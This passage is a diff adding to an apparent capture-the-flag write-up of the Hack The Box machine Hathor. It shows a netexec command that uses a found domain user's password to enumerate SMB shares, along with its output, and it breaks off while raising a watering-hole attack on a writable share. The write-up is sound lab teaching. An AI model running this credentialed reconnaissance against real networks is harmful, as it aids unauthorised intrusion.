@@ -268,3 +268,22 @@ nxc smb hathor.windcorp.htb -u 'beatricemill' -p '!!!!ilovegood17' -k --rid-brut
 ```
 Ill use this command to dump all the user to a user file!
 
+No kerberoastable users!
+
+```python
+nxc smb hathor.windcorp.htb -u 'beatricemill' -p '!!!!ilovegood17' -k --shares                                  
+SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         hathor.windcorp.htb 445    hathor           [+] windcorp.htb\beatricemill:!!!!ilovegood17 
+SMB         hathor.windcorp.htb 445    hathor           [*] Enumerated shares
+SMB         hathor.windcorp.htb 445    hathor           Share           Permissions     Remark
+SMB         hathor.windcorp.htb 445    hathor           -----           -----------     ------
+SMB         hathor.windcorp.htb 445    hathor           ADMIN$                          Remote Admin
+SMB         hathor.windcorp.htb 445    hathor           C$                              Default share
+SMB         hathor.windcorp.htb 445    hathor           IPC$            READ            Remote IPC
+SMB         hathor.windcorp.htb 445    hathor           NETLOGON        READ            Logon server share 
+SMB         hathor.windcorp.htb 445    hathor           share           READ,WRITE      
+SMB         hathor.windcorp.htb 445    hathor           SYSVOL          READ            Logon server share
+```
+I have Read and Write access on the `share` share!
+
+It could be a watering 
